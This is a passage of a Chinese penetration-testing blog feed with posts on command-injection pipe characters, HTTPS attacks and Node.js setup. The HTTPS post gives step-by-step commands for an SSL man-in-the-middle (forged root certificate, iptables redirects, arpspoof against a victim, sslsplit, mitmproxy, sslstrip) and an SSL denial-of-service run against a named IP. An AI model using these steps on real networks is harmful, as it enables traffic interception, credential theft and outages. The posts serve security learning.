http://www.test.com</code> 更好用</p><p>Note:    phantasm这里是在命令行启用</p><p>详细内容查看官方文档</p><blockquote><p>调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xray学习&quot;&gt;&lt;a href=&quot;#xray学习&quot; class=&quot;headerlink&quot; title=&quot;xray学习&quot;&gt;&lt;/a&gt;xray学习&lt;/h1&gt;&lt;p&gt;平时使用&lt;code&gt;webscan&lt;/code&gt;是最多的&lt;/p&gt;
&lt;p&gt;结合基础爬虫&lt;/p&gt;
&lt;figure
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="xray" scheme="http://www.xpshuai.cn/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>常见的管道符</title>
    <link href="http://www.xpshuai.cn/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    <id>http://www.xpshuai.cn/常见的管道符/</id>
    <published>2020-03-29T05:03:29.000Z</published>
    <updated>2020-03-29T05:46:59.424Z</updated>
    
    <content type="html"><![CDATA[<h4 id="常见的管道符："><a href="#常见的管道符：" class="headerlink" title="常见的管道符："></a>常见的管道符：</h4><h6 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h6><p><code>|</code>    直接执行后面的语句<br><code>||</code>    如果前面出错（即为false），就执行后面的语句（前面只能为假）<br><code>&amp;</code>    如果前面的语句为假则直接执行后面的语句（前面可真可假）<br><code>&amp;&amp;</code>    如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）</p><h6 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h6><p><code>;</code>    执行完前面再执行后面<br><code>|</code>    显示后面语句的执行结果<br><code>||</code>    前面语句出错时，执行后面的语句<br><code>&amp;</code>    如果前面的语句为假则直接执行后面的语句（前面可真可假）<br><code>&amp;&amp;</code>     如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）</p><h4 id="命令执行简介"><a href="#命令执行简介" class="headerlink" title="命令执行简介"></a>命令执行简介</h4><p>程序如果提供执行 命令的功能<br>比如提供了ping的功能： 输入 <code>ping | dir</code>,  利用了管道符执行了dir</p><p>php中常见的执行系统 命令的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system, exec, shell_exec, passthru, popen, proc_popen</span><br></pre></td></tr></table></figure><h6 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h6><ul><li>尽量不要使用系统命令执行函数</li><li>对客户端提交的变量进行过滤和检测</li><li>使用动态函数之前，确保使用的函数是置顶的函数之一</li><li>对php来说，不能完全控制的危险函数最好不要使用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;常见的管道符：&quot;&gt;&lt;a href=&quot;#常见的管道符：&quot; class=&quot;headerlink&quot; title=&quot;常见的管道符：&quot;&gt;&lt;/a&gt;常见的管道符：&lt;/h4&gt;&lt;h6 id=&quot;Windows：&quot;&gt;&lt;a href=&quot;#Windows：&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="常见的管道符" scheme="http://www.xpshuai.cn/tags/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS攻击</title>
    <link href="http://www.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB/"/>
    <id>http://www.xpshuai.cn/HTTPS攻击/</id>
    <published>2020-03-29T04:25:30.000Z</published>
    <updated>2020-03-29T04:55:32.854Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h1><p>防止恶意注入、DNS劫持</p><h4 id="https的作用"><a href="#https的作用" class="headerlink" title="https的作用"></a>https的作用</h4><ul><li>C I A </li><li>解决的是信息<code>传输过程中</code>数据被篡改、窃取</li><li>加密：对称、非对称、单向(Hash)</li></ul><h4 id="https攻击方法"><a href="#https攻击方法" class="headerlink" title="https攻击方法"></a>https攻击方法</h4><ul><li><p>降级攻击</p></li><li><p>解密攻击（明文、证书伪造）– 劫持</p></li><li><p>协议漏洞、实现方法的漏洞、配置不严格</p></li></ul><h5 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h5><p><code>SSL</code>（安全套接层, Secure socket layer）,后来使用<code>TSL</code>取代了SSL，只不过习惯了叫SSL</p><p><strong>SSL/TLS也被用于其他场景的传输通道加密：</strong></p><ul><li>邮件传输（服务器间、客户端与服务器间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul><p><strong>Web通信中SSL加密</strong></p><ul><li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li><li>常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec</li></ul><p><strong>加密过程：</strong>握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输</p><p><strong>非对称加密算法</strong></p><p>非对称加密一般用来加密比较小的数据<br>例如：RSA, ECC等</p><p><strong>对称加密算法</strong></p><p>DES/3DES, AES, IDEA, RC4 ……</p><p><strong>单向加密算法(Hash)</strong></p><table><thead><tr><th>Hash算法</th><th>Hash值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224,256,384,512</td></tr></tbody></table><p><strong>SSL的弱点</strong></p><ul><li>SSL是不同的对称、非对称、单项加密算法的组合加密实现(<code>cipher suite</code>)</li><li>服务器端为提供更好的兼容性，选择支持大量过时cipher suite</li><li>协商过程中墙皮降级加密强度</li><li>现代处理器计算能力可以在可接受的时间内破解过时加密算法</li><li>购买云计算资源破解</li></ul><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><blockquote><p>查看web站点用了啥样的ssl协议，什么版本，什么组合  </p></blockquote><h6 id="1-openssl命令"><a href="#1-openssl命令" class="headerlink" title="1.openssl命令"></a>1.<code>openssl</code>命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client --connect www.baidu.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment">#证书颁发机构也是树形结构的，有一级二级</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定查看是否支持某协议和组合</span></span><br><span class="line">openssl s_client -tls1_2 -cipher <span class="string">'ECDHE-ECDSA-AES128-GCM-SHA256'</span> -connect www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试是否可以跟已知的不安全的cipher suite建立连接</span></span><br><span class="line">openssl s_client -tls1_2 -cipher <span class="string">'NULL,EXPORT,LOW,DES'</span> -connect www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的不安全的组合cipher suite</span></span><br><span class="line">openssl ciphers -v <span class="string">'NULL,EXPORT,LOW,DES'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考网站（加密技术）</span></span><br><span class="line">https://www.openssl.org/docs/apps/ciphers.html</span><br></pre></td></tr></table></figure><p><img src="/HTTPS攻击/1.png" alt></p><p>Openssl需要大量密码学相关知识，命令复杂，结果可读性差</p><h6 id="2-SSLScan工具"><a href="#2-SSLScan工具" class="headerlink" title="2.SSLScan工具"></a>2.<code>SSLScan</code>工具</h6><ul><li>自动识别ssl配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查CRIME、心脏出血漏洞</li><li>绿色表示安全，红色黄色需要引起注意</li></ul><p>查看TLS支持的cipher suite</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查所有的支持的tls是否有不安全的</span></span><br><span class="line">sslscan --tlsall www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># Altnames选项下面的域名也可以使用上面域名的证书</span></span><br></pre></td></tr></table></figure><p>分析证书详细信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslscan --show-certificate -no-ciphersuites www.taobao.com:443</span><br></pre></td></tr></table></figure></p><h6 id="3-SSLyze工具"><a href="#3-SSLyze工具" class="headerlink" title="3.SSLyze工具"></a>3.<code>SSLyze</code>工具</h6><ul><li>Python编写</li><li>检查ssl过时版本</li><li>检查存在弱点的cipher suite</li><li>扫描多站点时，支持来源文件(多个站点放到一个文件里面)</li><li>检查是否支持会话恢复</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslyze --regular  www.supercomputerboytony.cn</span><br></pre></td></tr></table></figure><h6 id="4-Nmap"><a href="#4-Nmap" class="headerlink" title="4.Nmap"></a>4.<code>Nmap</code></h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举cipher suite</span></span><br><span class="line">nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn</span><br></pre></td></tr></table></figure><h6 id="5-在线网站："><a href="#5-在线网站：" class="headerlink" title="5. 在线网站："></a>5. 在线网站：</h6><p>输入域名，对SSL进行检测<br><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p><hr><h1 id="SSL中间人攻击"><a href="#SSL中间人攻击" class="headerlink" title="SSL中间人攻击"></a>SSL中间人攻击</h1><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>攻击者位于客户端和服务器通信链路中</p><ul><li>1.ARP欺骗（最常用）</li><li>2.DHCP<br>如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播)</li><li>3.修改网关</li><li>4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置)</li><li>5.修改HOSTS</li><li>6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议)  —&gt;如果处在同一局域网</li></ul><blockquote><p>不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习</p></blockquote><p>加密流量</p><p><img src="/HTTPS攻击/2.png" alt></p><blockquote><p>ps：下来的演示，是基于ARP欺骗的：</p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="攻击的前提"><a href="#攻击的前提" class="headerlink" title="攻击的前提"></a>攻击的前提</h5><ul><li>客户端已经信任了伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构（CA证书服务器）</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>对已经实现中间人欺骗(这里用<code>arpspoof</code>)后，下面的工具对信息进行解密</p><h6 id="1-SSLsplit工具"><a href="#1-SSLsplit工具" class="headerlink" title="1.SSLsplit工具"></a>1.<code>SSLsplit</code>工具</h6><ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书（利用<code>openssl</code>来生成伪造的证书）</li><li>支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击</li></ul><p><strong>1). openssl</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.利用openssl生成证书私钥</span></span><br><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.利用私钥签名生成证书(生效时间,使用的私钥文件)  -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的</span></span><br><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实）</span></span><br></pre></td></tr></table></figure><p><strong>2).攻击机器设置路由转发</strong><br>下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）：</p><p>做个地址转换, 比如:  把我计算机443端口收到的数据包转发到8443端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查看要用到的端口有没有被占用</span></span><br><span class="line">netstst -pantu |grep :80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nat表</span></span><br><span class="line">iptables -t nat -L</span><br><span class="line"></span><br><span class="line"><span class="comment"># -F  清空</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443   <span class="comment"># MSA</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443    <span class="comment"># SMTPS 发邮件</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443<span class="comment"># IMAPS    收邮件</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 <span class="comment">#POP3S</span></span><br><span class="line"><span class="comment">#其他使用ssl协议加密的协议端口一样</span></span><br><span class="line"></span><br><span class="line">iptables -L</span><br></pre></td></tr></table></figure><p><strong>3).ARP欺骗</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以发现：受害者机器上关于网关的mac已经换成了kali的</span></span><br></pre></td></tr></table></figure></p><p><strong>4).启动SSLsplit</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="built_in">test</span>/logdir</span><br><span class="line"></span><br><span class="line"><span class="comment"># -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听</span></span><br><span class="line">sslsplit -D -l connect.log -j /root/<span class="built_in">test</span> -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有操作完成了</span></span><br></pre></td></tr></table></figure></p><ul><li>然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览)  </li><li>我们可以查看日志和浏览器证书以及证书保存信息(<code>cat connect.log</code>) ,</li><li>具体通信数据在:<code>ls test/logdir</code>, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）<br>通过关键词查找内容：<code>grep xxx *.log</code>这样</li><li>在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了)</li></ul><blockquote><p>全站https/非全站https（比如只是登录等部分页面加了https）</p></blockquote><h6 id="2-Mitmproxy工具"><a href="#2-Mitmproxy工具" class="headerlink" title="2.Mitmproxy工具"></a>2.<code>Mitmproxy</code>工具</h6><ul><li>设置路由表转发规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">bug:</span> 只能在8080端口监听，所以需要修改规则</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080</span><br></pre></td></tr></table></figure><ul><li>也是使用<code>arpspoof</code>进行arp欺骗</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1</span><br></pre></td></tr></table></figure><ul><li>最后，Mitmproxy侦听</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -T --host -w mitmproxy.log</span><br><span class="line"></span><br><span class="line"># mitmproxy会自动生成一个证书</span><br></pre></td></tr></table></figure><h6 id="3-SSLstrip工具"><a href="#3-SSLstrip工具" class="headerlink" title="3.SSLstrip工具"></a>3.<code>SSLstrip</code>工具</h6><p>与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这种更实用便捷，但是......</span></span><br><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure></p><hr><h2 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h2><blockquote><p>和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源</p></blockquote><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><ul><li>SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题</li><li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li><li>与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次/s SSL握手请求</li></ul><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="thc-ssl-dos工具"><a href="#thc-ssl-dos工具" class="headerlink" title="thc-ssl-dos工具"></a><code>thc-ssl-dos</code>工具</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line">thc-ssl-dos 199.223.209.205 2083 -accept</span><br></pre></td></tr></table></figure><blockquote><p><code>dig</code>命令，解析ip地址</p></blockquote><hr><h2 id="补充概念"><a href="#补充概念" class="headerlink" title="补充概念"></a>补充概念</h2><h4 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h4><p>Asynchronous JavaScript and XML</p><p>是一组现有技术的组合</p><p>通过客户端脚本动态更新页面部分内容，而非整个页面   </p><p>降低带宽使用，提高速度</p><p>提升用户体验</p><p>后台异步访问</p><p><strong>Ajax组件</strong></p><ul><li>JavaScript(ajax的核心组件)</li><li>Dynamic HTML(DHTML) </li><li>DOM</li></ul><p><strong>ajax框架：</strong></p><ul><li>jQuery</li><li>Dojo Tookit</li><li>Google Web toolkit</li><li>Microsoft Ajax library</li></ul><p><strong>基于Ajax的Web应用工作流程</strong></p><p><img src="/HTTPS攻击/3.png" alt></p><blockquote><p>使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程)</p></blockquote><p><strong>Ajax的安全问题</strong></p><ul><li>多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程)</li><li>Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过</li><li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li><li>暴露应用程序逻辑</li></ul><p><strong>Ajax对渗透测试的挑战</strong></p><ul><li><p>异步请求数量多且隐蔽</p></li><li><p>触发Ajax请求的条件无规律</p></li><li><p>手动和阶段大力爬网可能产生大量遗漏</p></li></ul><p><strong>检查方法：</strong></p><ul><li>手动查看页面源代码有没有使用ajax（效率低一些）</li><li>浏览器打开审查元素：net –&gt; XHR  /   net –&gt; javascript</li><li>使用ZAP，使用ajax爬站功能</li></ul><h4 id="Web-Service"><a href="#Web-Service" class="headerlink" title="Web Service"></a>Web Service</h4><ul><li>面向服务的架构，便于不同系统集成共享数据和功能</li><li>尤其适合不想暴露数据模型和程序逻辑而访问数据的场景</li><li>无页面</li></ul><p><strong>两种类型：</strong></p><ul><li>SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全）  – Simple object access protocol</li><li>RESTful (json是首选的数据交换格式刷)</li></ul><p><strong>web service安全考虑：</strong></p><ul><li>使用API key或session token实现和跟踪身份认证</li><li>身份认证由服务器完成，而非客户端</li><li>API key, 用户名, Session token 永远不要通过URL发送</li><li>RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li><li>SOAP提供强于HTTPS的WS-security机制</li><li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key</li><li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li><li>使用所及token防止CSRF攻击</li><li>对用户提交参数过滤，建议部署基于严格白名单的方法</li><li>报错信息消毒</li><li>直接对象引用应严格身份验证(电商公司以ID作为主索引)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTPS攻击&quot;&gt;&lt;a href=&quot;#HTTPS攻击&quot; class=&quot;headerlink&quot; title=&quot;HTTPS攻击&quot;&gt;&lt;/a&gt;HTTPS攻击&lt;/h1&gt;&lt;p&gt;防止恶意注入、DNS劫持&lt;/p&gt;
&lt;h4 id=&quot;https的作用&quot;&gt;&lt;a href=&quot;#https
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="HTTPS攻击" scheme="http://www.xpshuai.cn/tags/HTTPS%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Node.js 入门</title>
    <link href="http://www.xpshuai.cn/Node-js-%E5%85%A5%E9%97%A8/"/>
    <id>http://www.xpshuai.cn/Node-js-入门/</id>
    <published>2020-03-27T10:18:49.000Z</published>
    <updated>2020-03-27T16:03:06.078Z</updated>
    
    <content type="html"><![CDATA[<p>Node.js是一个机遇Chrome V8引擎的JavaScript运行环境</p><p>Node.js的包管理器npm，是全球最大的开源生态库系统</p><p>Node.js可解析js代码，没有浏览器安全级别的限制</p><h2 id="一-开发环境配置"><a href="#一-开发环境配置" class="headerlink" title="一.开发环境配置"></a>一.开发环境配置</h2><p>官网： <a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p><p>API文档：<a href="http://nodejs.cn/api/events.html" target="_blank" rel="noopener">http://nodejs.cn/api/events.html</a></p><h4 id="如果需要安装多个版本"><a href="#如果需要安装多个版本" class="headerlink" title="如果需要安装多个版本"></a>如果需要安装多个版本</h4><p><strong>1).docker</strong></p><p><strong>2).使用nvm来安装并维护（<code>推荐</code>）</strong></p><p>项目地址：<a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">https://github.com/nvm-sh/nvm</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.安装nvm</span></span><br><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.配置环境变量</span></span><br><span class="line"><span class="comment">#linux下  .bash_profile或.bash_rc</span></span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"<span class="variable">$([ -z "$&#123;XDG_CONFIG_HOME-&#125;" ] &amp;&amp; printf %s "$&#123;HOME&#125;/.nvm" || printf %s "$&#123;XDG_CONFIG_HOME&#125;/nvm")</span>"</span></span><br><span class="line">[ -s <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; \. <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> <span class="comment"># This loads nvm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># windows系统。。。</span></span><br></pre></td></tr></table></figure><p>3.配置加速镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同样在上面的配置文件</span></span><br><span class="line"><span class="built_in">export</span> NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node</span><br></pre></td></tr></table></figure><h4 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a><strong>安装node</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装指定版本</span></span><br><span class="line">nvm install 8.0.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或安装最新的稳定版本</span></span><br><span class="line">nvm install --lts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或安装最新的版本</span></span><br><span class="line">nvm install node</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看安装的版本</span></span><br><span class="line">nvm ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前版本</span></span><br><span class="line">node -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换版本</span></span><br><span class="line">nvm use 6.11.2</span><br></pre></td></tr></table></figure><h4 id="体验一下"><a href="#体验一下" class="headerlink" title="体验一下"></a>体验一下</h4><p>在终端进入node命令行：<code>node</code>, 之后可以输入js代码了</p><p>在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有<code>dom</code>和<code>bom</code>的操作)</p><p>比如，查看本地进程<code>process</code></p><p>执行文件：<code>node index.js</code></p><h6 id="不用每次写完都运行命令来执行"><a href="#不用每次写完都运行命令来执行" class="headerlink" title="不用每次写完都运行命令来执行"></a>不用每次写完都运行命令来执行</h6><p>安装<code>nodemon</code>, 实时侦测文件的变化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install nodemon -g  <span class="comment"># 全局安装</span></span><br></pre></td></tr></table></figure><p>npm使用国内源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 永久</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>或安装使用<code>cnpm</code>命令</p><p>使用<code>nodemon</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nodemon index.js</span><br><span class="line"><span class="comment"># 这样就可以实时侦测了</span></span><br></pre></td></tr></table></figure><p>使用其他版本node来运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 